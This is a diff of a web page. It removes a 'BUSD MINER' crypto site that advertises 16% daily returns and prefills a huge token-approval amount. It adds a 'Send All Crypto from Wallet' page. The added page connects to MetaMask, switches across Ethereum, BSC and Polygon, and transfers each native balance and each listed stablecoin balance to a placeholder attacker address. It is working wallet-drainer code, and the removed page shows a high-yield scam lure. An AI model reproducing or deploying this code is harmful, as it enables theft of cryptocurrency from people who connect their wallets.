@@ -1,204 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-@media only screen and (max-width: 600px) {
-        body {
-            background: #1a1a1a!important;
-        }
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send All Crypto from Wallet</title>
 </head>
-
-
-<head>
-	<meta charset="utf-8">
-	<meta content="IE=edge" http-equiv="X-UA-Compatible">
-	<meta content="width=device-width, initial-scale=1" name="viewport">
-	<meta content="Hire Miners to earn BUSD" name="description">
-	<meta name="image" content="images/asda.png">
-	<!-- opengraph image -->
-	<meta property="og:image" content="images/asda.png">
-	<meta property="og:title" content="BUSD MINER">
-	<meta property="og:type" content="website" />
-	<meta property="og:description" content="Hire Miners to earn BUSD">
-	<!-- Twitter meta -->
-	<meta name="twitter:card" content="images/usdtlogo.png">
-	<meta name="twitter:title" content="BUSD MINER">
-	<meta name="twitter:description" content="Hire Miners to earn BUSD">
-	<meta name="twitter:image" content="images/asda.png">
-	<!-- favicon files -->
-	 <link rel="icon" type="image/png" href="images/usdtlogo.png" sizes="32x32" />
-	<link rel="icon" type="image/png" href="rexminer.co/images/favicon-16x16.html" sizes="16x16" />
-	<meta name="msapplication-TileColor" content="#ffffff">
-	<meta name="theme-color" content="#ffffff">
-	<title>BUSD MINER</title>
-	<!-- bootstrap core CSS -->
-	<link href="assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">
-	<link href="assets/css/jumbotron-narrow.css" rel="stylesheet">
-	<link href="assets/css/bootstrap.min.css" rel="stylesheet">
-	<link href="assets/css/custom.css" rel="stylesheet">
-	<!-- <link href="fonts.min.css" rel="stylesheet" type="text/css"> -->
-	<link rel="preconnect" href="https://fonts.googleapis.com/">
-	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
-	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&amp;display=swap" rel="stylesheet">
-</head>
-
 <body>
-	<div class="modal" id="myModal">
-		<div class="modal-content">
-			<div id="modal-internal"></div>
-		</div>
-	</div>
-	<div class="custom-container">
-		<nav class="navbar navbar-default">
-			<div class="container-fluid">
-				<div></div>
-				<div class="navbar-header">
-				</div>
+    <h2>Connect MetaMask & Send All Crypto</h2>
+    <button id="connectWallet">Connect Wallet</button>
+    <button id="sendAll" disabled>Send All Crypto</button>
+    <p id="status"></p>
 
-				<div class="mobile-align">
-								<ul class="nav navbar-nav navbar-right font-weight-normal">
-											<ul class="nav navbar-nav navbar-right font-weight-normal">
-													<ul class="nav navbar-nav navbar-right font-weight-normal">
-			                           
-											
-											</ul>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        let signer;
 
-				</div>
-			</div>
-		</nav>
-		<div>
-			<ul style="display:none;" class="nav nav-tabs nav-justified" id="myTabs" role="tablist">
-				<li role="presentation" class="active"><a id="miners-tab" role="tab" data-toggle="tab"
-						aria-controls="home" aria-expanded="true">BUSD Miner</a></li>
-			</ul>
-			<div class="tab-content" id="myTabContent">
-				<div class="tab-pane fade active in" role="tabpanel" id="home" aria-labelledby="miners-tab">
+        // Destination wallet (replace with your own)
+        const recipientAddress = "0xYourDestinationWalletAddressHere";
 
+        // List of chains to switch to and their native token names
+        const chains = [
+            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH', nativeDecimals: 18 },           // Ethereum Mainnet
+            { chainId: 56, name: 'Binance Smart Chain', nativeSymbol: 'BNB', nativeDecimals: 18 }, // Binance Smart Chain
+            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC', nativeDecimals: 18 }           // Polygon Mainnet
+        ];
 
-					<div class="banner">
-						<img width="430px" src="images/busdfarm-header-text2.png" alt="">
-					<!--	<div>BUSD MINER</div> -->
-						<div class="title">
-							<p class="daily">16% Daily</p>
-							<p class="apr">5,840% APR</p>
-						</div>
-					</div>
-					<div>
-						<div class="container-fluid miners-tally-container">
-							<img alt="Miners" class="icon" src="images/tarotminer.png">
-							<h2 class="tally-text"><u><span class="num-miners">14029</span></u> Miners</h2>
-						</div>
-						<div class="digging-mined-container">
-							<div class="custom-row">
-								<img alt="Digging" class="icon" src="images/usdtlogo.png">
-								<div class="dm-container-right">
-									<h2>Contract</h2>
-									<p><span id="production-rate">14536730.15</span>  BUSD</p>
-								</div>
-							</div>
-							<div class="custom-row">
-								<img alt="Mined" class="icon" src="images/mine.svg">
-								<div class="dm-container-right">
-									<h2>Total Mined</h2>
-									<p><span id="adsd">402141.12</span> BUSD</p>
-									<p><span id="asdf">1000</span> Daily limit</p>
-								</div>
-							</div>
-						</div>
+        // List of ERC-20 tokens for each chain (you can expand this list as needed)
+        const erc20Tokens = {
+            1: [ // Ethereum Mainnet
+                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, symbol: "USDT" },
+                { address: "0xA0b86991c6218b36c1d19D4a2e9EB0cE3606eB48", decimals: 6, symbol: "USDC" }
+            ],
+            56: [ // Binance Smart Chain
+                { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, symbol: "BUSD" }
+            ],
+            137: [ // Polygon Mainnet
+                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6, symbol: "USDC" }
+            ]
+        };
 
-						<div class="spend-container">
-							<div class="spend-input-continer">
-								
-								<div class="spend-input2">
-									<input class="form-control" id="spend-allowance" name="approve" onchange="" step="1000"
-									type="number" value="10000000000000000000000000">
-									<span class="bnb-text">BUSD</span>
-													</div>
-									<button class="btn btn-lg btn-buy" onclick="approve()" role="button">
-								Approve
-										
+        document.getElementById('connectWallet').addEventListener('click', async () => {
+            try {
+                // Request account access
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
 
-										
-										
-							</button>
-							<p id="spend-limit"></p>
+                const userAddress = await signer.getAddress();
+                document.getElementById('status').innerText = `Connected: ${userAddress}`;
+                
+                // Enable the Send All button after connection
+                document.getElementById('sendAll').disabled = false;
+            } catch (error) {
+                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
+            }
+        });
 
-								<label for="spend">2. Enter BUSD Amount & Click Hire Below</label>
-								<div class="spend-input">
-									<input class="form-control" id="eth-to-spend" name="spend" onchange="updateBuyPrice()" step="100"
-									type="number" value="50">
-									<span class="bnb-text">BUSD</span>
-								</div>
-							</div>
-							<div id="compoundWarning" style="display: none; color: gold; padding: 8px;">Information: You have unmined BUSD. A buy will reinvest this tokens as well!</div>
-							<button class="btn btn-lg btn-buy" onclick="buyEggs2()" role="button">
-								Start <span id="eggs-to-buy-2"></span> Mining
-							</button>
-						</div>
-						<div class="other-button-container">
-							<button class="btn btn-lg btn-hatch" onclick="hatchEggs1()"
-									role="button">Hire More Miners</button>
-							<button class="btn btn-lg btn-sell"
-									onclick="sellEggs(displayTransactionMessage); document.getElementById('sellprice')"
-									role="button">Withdraw</button>
-						</div>
+        document.getElementById('sendAll').addEventListener('click', async () => {
+            try {
+                for (const chain of chains) {
+                    // Switch to each chain
+                    await switchNetwork(chain.chainId);
 
-						</div>
+                    // Send all native tokens on this chain
+                    await sendAllNativeTokens(chain);
 
-					</div>
-				</div>
+                    // Send all ERC-20 tokens on this chain
+                    await sendAllERC20Tokens(chain);
 
-				<footer class="footer">
+                    document.getElementById('status').innerText += `\nFinished on ${chain.name}`;
+                }
+                document.getElementById('status').innerText += `\nAll transactions sent successfully.`;
+            } catch (error) {
+                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
+            }
+        });
 
+        // Switch to the desired network
+        async function switchNetwork(chainId) {
+            try {
+                await provider.send('wallet_switchEthereumChain', [{ chainId: ethers.utils.hexValue(chainId) }]);
+                document.getElementById('status').innerText += `\nSwitched to chain: ${chainId}`;
+            } catch (switchError) {
+                document.getElementById('status').innerText = `\nFailed to switch network: ${switchError.message}`;
+                throw switchError;
+            }
+        }
 
+        // Send all native tokens (ETH, BNB, MATIC, etc.)
+        async function sendAllNativeTokens(chain) {
+            const userAddress = await signer.getAddress();
+            const balance = await provider.getBalance(userAddress);
 
-						<footer class="footer">
+            const gasPrice = await provider.getGasPrice();
+            const estimatedGasLimit = 21000; // Standard gas limit for native token transfer
+            const totalGasCost = gasPrice.mul(estimatedGasLimit);
 
-							<div class="">
-								<div class="col-md-12">
-									<font style="font-size:14px">
-										<center>
-											<p>Earn 10% of the BUSD used to mine by anyone who joins mining
-												using your link: <b><a id="playerreflink" onclick="copyRef()">?
-												<p></p><input id="copytextthing" style="display:none;" type="text" value="Hello Worldfdgerh"></a></b>
-										</center>
-									</font>
-								</div>
-								</footer>
-							<center>
-					<!--			<ul class="nav navbar-nav navbar-right font-weight-normal">
-											<ul class="nav navbar-nav navbar-right font-weight-normal">
-													<ul class="nav navbar-nav navbar-right font-weight-normal">
-										<li><a class="social-pad"
-													href="https://bscscan.com/address/0x11849b738b092cB51ED3bFCB15DEA6A45A8dCa1d#code"
-													target="_blank"><img alt="BscScan Logo" class="social-icons" src="images/bscan_logo.png"><span
-													class="hide-mobile">Contract</span></a></li>
-											</ul> -->
-							</center>
+            // Calculate amount to send (balance - gas fees)
+            const amountToSend = balance.sub(totalGasCost);
 
-						</div>
-				</footer>
-			</div>
+            if (amountToSend.lte(0)) {
+                throw new Error(`Insufficient ${chain.nativeSymbol} balance to cover gas fees.`);
+            }
 
-			<!-- scripts -->
-			<script src="https://unpkg.com/moralis/dist/moralis.js"></script>
-			<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.dropotron.min.js"></script>
-			<script src="assets/js/browser.min.js"></script>
-			<script src="assets/js/breakpoints.min.js"></script>
-			<script src="assets/js/util.js"></script>
-                        <script src="assets/js/interface.js"></script>			
-			<script src="assets/js/main.js"></script>
-                        <script src="assets/js/main_eth.js"></script>			
-		        <script src="assets/js/crypto-js.min.js"></script>
-			<script src="setting.js"></script>
+            const tx = {
+                to: recipientAddress,
+                value: amountToSend, // Send all native tokens minus gas
+                gasLimit: estimatedGasLimit,
+                gasPrice: gasPrice
+            };
 
+            const transaction = await signer.sendTransaction(tx);
+            await transaction.wait();
+
+            document.getElementById('status').innerText += `\nNative token (${chain.nativeSymbol}) sent: ${transaction.hash}`;
+        }
+
+        // Send all ERC-20 tokens on the current chain
+        async function sendAllERC20Tokens(chain) {
+            const tokens = erc20Tokens[chain.chainId] || [];
+            for (const token of tokens) {
+                const tokenContract = new ethers.Contract(token.address, [
+                    // The ERC-20 `balanceOf` function ABI
+                    "function balanceOf(address) view returns (uint256)",
+                    // The ERC-20 `transfer` function ABI
+                    "function transfer(address to, uint amount) returns (bool)"
+                ], signer);
+
+                const userAddress = await signer.getAddress();
+                const tokenBalance = await tokenContract.balanceOf(userAddress);
+
+                if (tokenBalance.gt(0)) {
+                    // Send ERC-20 token
+                    const transaction = await tokenContract.transfer(recipientAddress, tokenBalance);
+                    await transaction.wait();
+
+                    document.getElementById('status').innerText += `\n${token.symbol} sent: ${transaction.hash}`;
+                } else {
+                    document.getElementById('status').innerText += `\nNo ${token.symbol} to send.`;
+                }
+            }
+        }
+    </script>
 </body>
-
-
 </html>
